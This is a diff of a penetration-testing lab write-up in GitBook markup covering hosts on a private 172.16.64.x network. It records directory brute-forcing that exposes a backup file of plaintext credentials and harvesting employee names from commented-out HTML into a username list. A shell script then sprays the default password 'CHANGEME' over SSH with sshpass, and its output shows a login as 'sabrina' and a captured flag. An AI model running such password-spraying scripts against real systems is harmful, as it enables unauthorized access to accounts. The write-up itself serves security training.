@@ -586,7 +586,9 @@ Files found with a 500 responce:
 {% endtabs %}
 
 {% hint style="warning" %}
-**Dirbuster found http://172.16.64.81:80/webapp/img/custom/thumbs/users.bak**
+**Dirbuster found the following route with potential credentials!**
+
+* [http://172.16.64.81:80/webapp/img/custom/thumbs/users.bak](http://172.16.64.81:80/webapp/img/custom/thumbs/users.bak)
 
 ```text
 john1:password123
@@ -602,7 +604,7 @@ peter:youdonotguessthatone5
 | 6379/tcp | open | redis | Redis key-value store |
 
 {% tabs %}
-{% tab title="Dirbuster" %}
+{% tab title="OWASP Dirbuster 1.0-RC1" %}
 * Target URL: [http://172.16.64.](http://172.16.64.81)91
 * File Extension: \*
 * File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
@@ -772,7 +774,7 @@ Dirs found with a 403 response:
 {% endtabs %}
 
 {% hint style="info" %}
-**Warning about password policy**
+**\[SSH\] Warning about password policy**
 
 Employees are requested to change their default `CHANGEME` password.
 
@@ -788,6 +790,351 @@ ssh admin@172.16.64.166 -p 2222                                                 
 Dear employee! Remember to change the default CHANGEME password ASAP.
 
 admin@172.16.64.166's password: 
+```
+{% endhint %}
+
+{% hint style="info" %}
+**\[Web\] Found commented** info **for logged in users on the website's markup**!
+
+ ![](../../.gitbook/assets/image%20%2824%29.png) 
+{% endhint %}
+
+{% tabs %}
+{% tab title="Grab website" %}
+```
+wget  
+xmllint --html about-us.htm --xpath '//comment()'
+
+```
+{% endtab %}
+
+{% tab title="Commented markup" %}
+```bash
+about-us.htm:47: HTML parser error : Tag header invalid
+  <header id="header">
+                     ^
+about-us.htm:60: HTML parser error : Tag nav invalid
+             <nav id="nav" role="navigation">
+                                            ^
+about-us.htm:86: HTML parser error : Tag section invalid
+<section id="titlebar">
+                      ^
+about-us.htm:95: HTML parser error : Tag nav invalid
+			<nav id="breadcrumbs">
+			                     ^
+about-us.htm:304: HTML parser error : Tag footer invalid
+  <footer id="footer">
+                     ^
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--<![endif]-->
+<!--
+	ucorpora by freshdesignweb.com
+	Twitter: https://twitter.com/freshdesignweb
+	https://www.freshdesignweb.com/ucorpora/
+-->
+<!-- Basic Meta Tags -->
+<!--[if (gte IE 9)|!(IE)]>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+  <![endif]-->
+<!-- Favicon -->
+<!-- Styles -->
+<!-- Font Avesome Styles -->
+<!--[if IE 7]>
+		<link href="css/font-awesome/font-awesome-ie7.min.css" rel="stylesheet">
+	<![endif]-->
+<!-- FlexSlider Style -->
+<!-- Internet Explorer condition - HTML5 shim, for IE6-8 support of HTML5 elements -->
+<!--[if lt IE 9]>
+		<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+<!-- Header -->
+<!-- Logo -->
+<!-- Submenu -->
+<!-- End Submenu -->
+<!-- Header End -->
+<!-- Titlebar
+================================================== -->
+<!-- Container -->
+<!-- Container / End -->
+<!-- Content -->
+<!-- Our Team -->
+<!-- For logged in only    
+          <div  class="slider2 team flexslider">
+            <ul class="slides">
+              <li>
+                <div class="row">
+                                  
+                  <a href="#">
+                    <div class="span3 square-1">
+                      <div class="img-container">
+                        <img src="img/our-team/1.jpg" alt="">
+                        <div class="img-bg-icon"></div>
+                      </div>
+                      <h4>Elizabeth Lopez</h4>
+                        managing director  
+                    </div>
+                  </a>
+                  
+                  <a href="#">
+                    <div class="span3 square-1">
+                      <div class="img-container">
+                        <img src="img/our-team/2.jpg" alt="">
+                        <div class="img-bg-icon"></div>
+                      </div>
+                      <h4>Tara Baker</h4>
+                        designer
+                    </div>
+                  </a>
+                  
+                  <a href="#">
+                    <div class="span3 square-1">
+                      <div class="img-container">
+                        <img src="img/our-team/3.jpg" alt="">
+                        <div class="img-bg-icon"></div>
+                      </div>
+                      <h4>Becky Casey</h4>
+                        project manager 
+                    </div>
+                  </a>
+                  
+                  <a href="#">
+                    <div class="span3 square-1">
+                      <div class="img-container">
+                        <img src="img/our-team/4.jpg" alt="">
+                        <div class="img-bg-icon"></div>
+                      </div>
+                      <h4>Randy Carlson</h4>
+                        developer
+                    </div>
+                  </a>
+                  
+                </div> 
+              </li>
+              <li>
+                <div class="row">
+                
+                  <a href="#">
+                    <div class="span3 square-1">
+                      <div class="img-container">
+                        <img src="img/our-team/3.jpg" alt="">
+                        <div class="img-bg-icon"></div>
+                      </div>
+                      <h4>Pablo Roberts</h4>
+                        founder
+                    </div>
+                  </a>
+                  
+                  <a href="#">
+                    <div class="span3 square-1">
+                      <div class="img-container">
+                        <img src="img/our-team/4.jpg" alt="">
+                        <div class="img-bg-icon"></div>
+                      </div>
+                      <h4>Bessie Hammond</h4>
+                        programmer 
+                    </div>
+                  </a>
+                  
+                  <a href="#">
+                    <div class="span3 square-1">
+                      <div class="img-container">
+                        <img src="img/our-team/1.jpg" alt="">
+                        <div class="img-bg-icon"></div>
+                      </div>
+                      <h4>Gerardo Malone</h4>
+                        junior designer
+                    </div>
+                  </a>
+                  
+                  <a href="#">
+                    <div class="span3 square-1">
+                      <div class="img-container">
+                        <img src="img/our-team/2.jpg" alt="">
+                        <div class="img-bg-icon"></div>
+                      </div>
+                      <h4>Sabrina Summers</h4>
+                        analyst
+                    </div>
+                  </a>
+                  
+                </div> 
+              </li>
+            </ul>
+          </div>
+           //Our Team End -->
+<!-- Typography Row -->
+<!-- Line -->
+<!-- Button -->
+<!-- Title -->
+<!-- Line -->
+<!-- Typography Row End-->
+<!-- List -->
+<!-- List End -->
+<!-- Progress Bar -->
+<!-- Progress Bar End -->
+<!-- Client Says -->
+<!-- Client Says End -->
+<!-- Content End -->
+<!-- Footer -->
+<!-- Footer End -->
+<!-- JavaScripts -->
+
+```
+{% endtab %}
+
+{% tab title="users.txt" %}
+```
+# We generate this dictionary from the names found in the commented markup
+elizabeth 
+Lopez
+elizabethlopez
+elopez
+managingdirector
+director
+manager  
+tara
+baker
+tarabaker
+tbaker
+designer
+beckycasey
+becky
+casey
+bcasey
+project
+manager 
+projectmanager
+randy
+carlson
+randycarlson
+rcarlson
+developer
+pabloroberts
+pablo
+roberts
+proberts
+founder
+bessiehammond
+bessie
+hammond
+bhammond
+programmer 
+gerardomalone
+gerardo
+malone
+gmalone
+juniordesigner
+junior
+designer
+sabrina 
+```
+{% endtab %}
+
+{% tab title="script.sh" %}
+```bash
+#!/bin/sh
+# Brutefoce known users against SSH with password CHANGEME
+
+for user in $(cat users.txt); 
+do
+    echo "Trying '$user'..."
+    sshpass -p CHANGEME ssh -p 2222 $user@172.16.64.166 2>/dev/null
+    if [ $? -eq 0 ]; then
+        exit
+    fi
+done;
+```
+{% endtab %}
+
+{% tab title="Output" %}
+```
+$ sh script.sh                              
+Trying 'elizabeth'...
+Trying 'Lopez'...
+Trying 'elizabethlopez'...
+Trying 'elopez'...
+Trying 'managingdirector'...
+Trying 'director'...
+Trying 'manager'...
+Trying 'tara'...
+Trying 'baker'...
+Trying 'tarabaker'...
+Trying 'tbaker'...
+Trying 'designer'...
+Trying 'beckycasey'...
+Trying 'becky'...
+Trying 'casey'...
+Trying 'bcasey'...
+Trying 'project'...
+Trying 'manager'...
+Trying 'projectmanager'...
+Trying 'randy'...
+Trying 'carlson'...
+Trying 'randycarlson'...
+Trying 'rcarlson'...
+Trying 'developer'...
+Trying 'pabloroberts'...
+Trying 'pablo'...
+Trying 'roberts'...
+Trying 'proberts'...
+Trying 'founder'...
+Trying 'bessiehammond'...
+Trying 'bessie'...
+Trying 'hammond'...
+Trying 'bhammond'...
+Trying 'programmer'...
+Trying 'gerardomalone'...
+Trying 'gerardo'...
+Trying 'malone'...
+Trying 'gmalone'...
+Trying 'juniordesigner'...
+Trying 'junior'...
+Trying 'designer'...
+Trying 'sabrina'...
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-104-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+195 packages can be updated.
+10 updates are security updates.
+
+Last login: Thu Jul 22 22:17:15 2021 from 172.16.64.10
+sabrina@xubuntu:~$ 
+```
+{% endtab %}
+{% endtabs %}
+
+{% hint style="info" %}
+**Found hosts.bak in sabrina's account via ssh**
+
+```text
+sabrina@xubuntu:~$ cat ~/hosts.bak 
+127.0.0.1	localhost
+172.16.64.81	cms.foocorp.io
+172.16.64.81    static.foocorp.io
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+{% endhint %}
+
+{% hint style="success" %}
+**Flag encountered!**
+
+```text
+sabrina@xubuntu:~$ cat ~/flag.txt 
+Congratulations! You have successfully exploited this machine.
+Go for the others now.
 ```
 {% endhint %}
 
